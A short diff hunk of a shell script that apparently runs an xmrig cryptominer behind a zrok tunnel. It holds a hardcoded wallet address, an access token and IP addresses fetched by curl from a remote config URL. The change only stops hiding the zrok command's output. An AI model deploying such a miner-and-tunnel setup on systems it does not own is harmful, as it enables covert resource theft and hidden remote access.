@@ -6,7 +6,7 @@ WALLET="85RcBrmqpB2TboWNtPUEzTLR5QVqZSiTPdq1fTiGdwvmC5E2rUzovKqArdYToBEZWz3qxthg
 BIND_IPS=$(curl -s $CONFIG_URL)
 pkill -f zrok
 pkill -f xmrig-x86_64-st
-./zrok enable 23hr12Uz33O1 > /dev/null 2>&1
+./zrok enable 23hr12Uz33O1
 
 for ip in $BIND_IPS; do
     echo "Binding bridge to $ip..."
